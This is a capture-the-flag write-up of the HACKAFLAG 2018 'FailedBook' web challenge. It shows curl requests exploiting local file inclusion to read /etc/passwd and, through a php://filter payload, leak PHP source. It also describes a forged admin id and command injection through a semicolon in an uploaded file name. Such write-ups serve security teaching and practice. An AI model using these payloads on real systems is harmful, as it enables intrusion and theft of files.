---
title: HACKAFLAG 2018 - Etapa Salvador - FailedBook
layout: post
date: '2018-08-27 09:00:00'
description: Writeup of FailedBook challenge Salvador's stage - HACKAFLAG 2018
image: https://i.imgur.com/i4dxOaA.png
tags:
- ctf
- writeup
author: shrimpgo
---
### FailedBook (web500)

>Description:
>do it all you need to get shell
>
>Autor: @keerok
>
>URL: http://chall.hackaflag.com.br:8664

---
Below, the main page of chall:

![alt text](https://i.imgur.com/pYXMS1X.png)

Of course, we don't have login access, but it's possible to register a new login at link `Cadastro` highlighted at image above:

![alt text](https://i.imgur.com/ISveHen.png)

This page has 4 boxes: `username`, `senha` (password), `confirmar senha` (retype password) e `verificação` (verification code). Below has a information `MD5 = substr(md5(s),0,6) = 49eb0f`. This line code means: get first 6 characters from MD5 result from `s` string (senha) in PHP, implying that code referers to verification code. We have to find a word that matches with MD5's first 6 characters. Creating a wordlist with all printable characters with 3 letters:

```bash
$ crunch 3 3 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\!\@\#\$\%\^\&\*\(\)\-_\+\=\~\`\[\]\{\}\|\\\:\;\"\'\<\>\,\.\?\/ -o wordlist.txt

```

Using this wordlist to find MD5 that matches with any line:

```python
import hashlib

wl = open('wordlist.txt', 'r').read().split('\n')
for i in wl:
    md5 = hashlib.md5(i).hexdigest()[:6]
    if md5 == '49eb0f':
        print('Found! Verification code is '+i)
```

```bash
$ python crack.py
Found! Verification code is {d?
```
Now we have all of items to register our credential:


```bash
username: shrimpgo
senha: testing
verificação: {d?
```

![alt text](https://i.imgur.com/hGm2X97.png)

Logging in:

![alt text](https://i.imgur.com/i4dxOaA.png)

Looking at source code, all of three images from Mark Zuckerberg origins from `link.php?path=null&file=4fe4277bd71aa03f702a08fc5711a48c/dolphin2.jpg&type=aW1hZ2UvanBlZw%3D%3D`. Maybe URI leads to LFI... Spliting URI, we have `path=null`, `file=path/to/image` and `type=aW1hZ2UvanBlZw%3D%3D`. Decoding base64 from var called `type`:

```bash
$ echo aW1hZ2UvanBlZw== | base64 -d
image/jpeg
```

We see clearly this referes to MIME type. Let's change this to `text/html`:

```bash
$ echo -n "text/plain"| base64
dGV4dC9wbGFpbg==
```

Now we're going to try some common LFI paths known (see [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)) in `file` var:

```bash
$ curl "http://chall.hackaflag.com.br:8664/logado/link.php?path=null&file=index.php&type=dGV4dC9wbGFpbg=="
Hacker Detected ;)!
$ curl "http://chall.hackaflag.com.br:8664/logado/link.php?path=null&file=.htaccess&type=dGV4dC9wbGFpbg=="
Hacker Detected ;|!
```

I noted that expressions when I put some words like htaccess, htpassword, access, error etc., becomes `:|` and other errors becomes `:)`. Testing other paths, finally I certified that LFI exists:

```bash
$ curl "http://chall.hackaflag.com.br:8664/logado/link.php?path=null&file=/etc/passwd&type=dGV4dC9wbGFpbg=="
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
```

Running all of these tests, I realized that `path` var doesn't do anything, it's only confuses the player. Trying to read index.php from LFI, I still can't read:

```bash
$ curl "http://chall.hackaflag.com.br:8664/logado/link.php?path=null&file=index.php&type=dGV4dC9wbGFpbg=="
Hacker Detected ;)!
```

Looking at mentioned site earlier, I tried PHP filter function:

```bash
$ curl -s "http://chall.hackaflag.com.br:8664/logado/link.php?path=null&file=php://filter/convert.base64-encode/resource=index.php&type=dGV4dC9wbGFpbg==" | base64 -d
```

```php
<?php
session_start();

if(!isset($_SESSION['username'])){
  header("Location: ../");
  exit(0);
}
if(!isset($_GET['id']) || empty($_GET['id'])){
  header("Location: ?id=".urlencode(base64_encode(convert_uuencode($_SESSION['username']))));
}

?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    	<link rel="stylesheet" type="text/css" href="../vendor/bootstrap/css/bootstrap.min.css">
    <title>Welcome</title>
    <a href="logout.php">Logout</a>
    <?php echo "<br><br><p style='color: white'>Welcome " . convert_uudecode(base64_decode(urldecode($_GET['id']))) . "</p><br><br>"; ?>
    <style rel='stylesheet' type='text/css'>
      body{
        background-image: url('background.jpg');
        background-repeat: no-repeat;
        background-position: 10% 10%;
}
      }
    </style>
  </head>
  <body>
    <main role='main'>
      <div class='container'>

<?php

if(convert_uudecode(base64_decode(urldecode($_GET['id']))) != "admin"){

 ?>
 <div class='row'>
   <?php
   $images = scandir('./4fe4277bd71aa03f702a08fc5711a48c');
   foreach ($images as $image) {
     if($image != '..' && $image != '.' && $image != ' ' && $image != 'index.php'){
       echo "<div class='col-md-4'><img src='link.php?path=null&file=4fe4277bd71aa03f702a08fc5711a48c/".$image."&type=".urlencode(base64_encode(mime_content_type("4fe4277bd71aa03f702a08fc5711a48c/".$image)))."' width='200px' height='200px' class='rounded mx-auto d-block'></div>";
     }
   }
    ?>
  </div>
<?php
}else{
?>
<form  action="upload.php?id=<?php echo $_GET['id']; ?>" method="post" enctype="multipart/form-data">
  <input class='form-control' type="file" name="image">
  <button type="submit" class='btn btn-primary' name="sub">Upload</button>
</form>
</div>
<?php
}
 ?>
</div>
</main>
</body>
</html>
```

Cool! This code shows an important part: if var `id`, encoded with base64 and uuencode, was `admin`, then this page will show an another content, an upload form. So, it's only encode `admin` and put the result in var `id`. I encoded uuencode and base64 [here](http://encode.urih.com/):

![alt text](https://i.imgur.com/aNR05k5.png)

![alt text](https://i.imgur.com/mUXog4Y.png)

I'll access this login with the new id:

![alt text](https://i.imgur.com/PAtreB1.png)

It works! Now, I'm going to upload something:

![alt text](https://i.imgur.com/EVI5PVe.png)

![alt text](https://i.imgur.com/pnbuR1n.png)

Ooops! It's not allowed. Trying now images (ie. jpg):

![alt text](https://i.imgur.com/CbR7A8D.png)

Ok, now it worked. But accessing this path, always gives me a 404 error, this path doesn't exist. Analysing deeply, I've noted that last line is the same output for the `file` command in bash. I'll intercept this POST request with burpsuite and I'll try RCE:

![alt text](https://i.imgur.com/J12WSC9.png)

I have to insert some command and, at same time, keeping the extension image at end of file. To do this, I'll put semicolon `;` to force running a command that I want:

![alt text](https://i.imgur.com/dzD369S.png)

WOW! You don't need to effort so much to get the flag:

![alt text](https://i.imgur.com/kEpT0Zf.png)

![alt text](https://i.imgur.com/fUjcLlt.png)

